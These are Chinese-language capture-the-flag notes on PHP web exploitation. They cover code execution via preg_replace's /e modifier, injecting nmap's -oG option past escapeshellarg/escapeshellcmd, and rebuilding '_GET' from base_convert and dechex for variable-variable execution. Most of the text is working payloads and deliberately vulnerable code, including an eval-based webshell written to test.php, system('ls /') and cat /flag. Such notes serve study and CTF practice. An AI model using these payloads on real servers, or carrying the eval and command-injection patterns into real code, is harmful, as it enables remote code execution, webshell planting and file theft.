## **preg_replace函数代码执行**
正则替换函数
```
function getFlag(){
    @eval($_GET['cmd']);
}

//将每个get传参的参数和参数值进行匹配
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
```



```
如果传参
参数 "/([A-Z])/"; // 匹配大写字母的正则表达式
值 "Hello World"

preg_replace 函数来将字符串中的大写字母转换为小写字母：
这段代码执行后会输出 "hello world"
```
这里的漏洞出在preg_replace /e 模式下。
值用${}包裹后会代码执行。
```
比如我们传入  ?.*={${phpinfo()}}
原句：preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); 
就变成preg_replace('/(' .* ')/ei','strtolower("\\1")',{${phpinfo()}});

又因为$_GET传入首字母是非法字符时候会把 .（点号）改成下划线，因此得将\.*换成\S*

所以payload：?\S*=${getFlag()}&cmd=system('ls /'); 
此时getFlag()会被代码执行，调用函数，即可使用cmd。
```


^
## **过滤函数**
```
$host = $_GET['host'];
$host = escapeshellarg($host);
$host = escapeshellcmd($host);
echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
```
利用特性，和namp参数写文件webshell
```
?host=' <?php @eval($_POST["cmd"]);?> -oG test.php '
或直接读
?host=' <?php echo `cat /flag`;?> -oG test.php '
```



^
## **进制转换函数**
```
base_convert(37907361743,10,36) = "hex2bin"

hex2bin(5f 47 45 54) = "_GET"

dechex(1598506324) =  "5f 47 45 54"

_GET = base_convert(37907361743,10,36)(dechex(1598506324))

变量覆盖
/?c=$p=base_convert(37907361743,10,36)(dechex(1598506324));($$p){pi}(($$p){abs})&pi=system&abs=cat /flag
```